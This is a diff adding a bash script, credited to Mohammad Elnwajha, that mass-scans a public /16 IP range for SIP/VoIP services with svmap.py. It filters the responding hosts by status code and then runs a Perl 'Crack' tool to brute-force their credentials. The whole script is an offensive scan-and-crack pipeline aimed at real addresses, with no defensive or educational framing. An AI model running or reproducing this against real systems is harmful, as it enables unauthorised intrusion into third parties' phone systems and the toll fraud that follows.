@@ -1,5 +1,52 @@
+
 برمجة جديدة
 
+#!/bin/bash
+
+# Scan IPv4 range on port sip
+
+echo -e "\nStart scanning ...\n"
+
+VAR1=188.165.50.39/16
+
+     echo ----------------$VAR1----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR1 -m INVITE -v >> result.txt
+
+
+echo "we scaned Everythings"
+sleep 30
+
+echo -e "\nEnding scanning port !\n"
+
+# SIP Responses
+
+echo -e "\nStart SIP Responses ...\n"
+
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" result.txt >>IPS
+perl run IPS
+cat 401.pal 400.pal 403.pal 404.pal >> ipSIP
+rm IPS # remove the file IPS
+mv result.txt =188.txt # remove the file
+sleep 5
+
+echo -e "\nEnding Responses !\n"
+
+# SIP Crack
+
+echo -e "\nStart SIP Crack ...\n"
+
+perl Crack 200 2 ipSIP
+rm ipSIP # remove the file ipSIP
+rm *.pal # remove the file
+
+sleep 5
+
+echo -e "\nEnding crack !\n"
+echo -e "\nby Mohammad Elnwajha\n"
+
+
+
+=================================================================================================
 #!/bin/bash
 
 # Scan IPv4 range on port sip
